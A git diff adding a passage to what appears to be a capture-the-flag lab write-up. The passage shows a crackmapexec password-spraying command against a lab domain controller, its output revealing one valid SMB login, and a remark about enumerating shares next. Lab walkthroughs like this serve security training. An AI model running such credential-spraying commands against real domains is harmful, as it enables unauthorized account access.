@@ -75,5 +75,27 @@ rpcclient $>
 ```
 login rpcclient anonymous, querying dominfo, we got users and a potential password. `HotelCalifornia194!`
 
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Resourced]
+└─$ crackmapexec smb 192.168.153.175 -u users.txt -p 'HotelCalifornia194!'
+SMB         192.168.153.175 445    RESOURCEDC       [*] Windows 10.0 Build 17763 x64 (name:RESOURCEDC) (domain:resourced.local) (signing:True) (SMBv1:False)
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\administrator:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\d.durant:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\g.goldberg:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\j.johnson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\k.keen:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\l.livingstone:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\m.mason:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\p.parker:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\r.robinson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [-] resourced.local\s.swanson:HotelCalifornia194! STATUS_LOGON_FAILURE 
+SMB         192.168.153.175 445    RESOURCEDC       [+] resourced.local\v.ventz:HotelCalifornia194! 
+SMB         192.168.153.175 445    RESOURCEDC       [-] Unexpected error with Neo4J
+SMB         192.168.153.175 445    RESOURCEDC       [-] Account not found on the domain
+```
+checking for access, we got access to smb using the creds `v.ventz:HotelCalifornia194!` but not local admin, let's enumerate further. 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9ab5d134-368f-4a89-a43a-51bc94ec2731)
+
+using crackmap to enumerate shares, we got some shares we can read. 
 
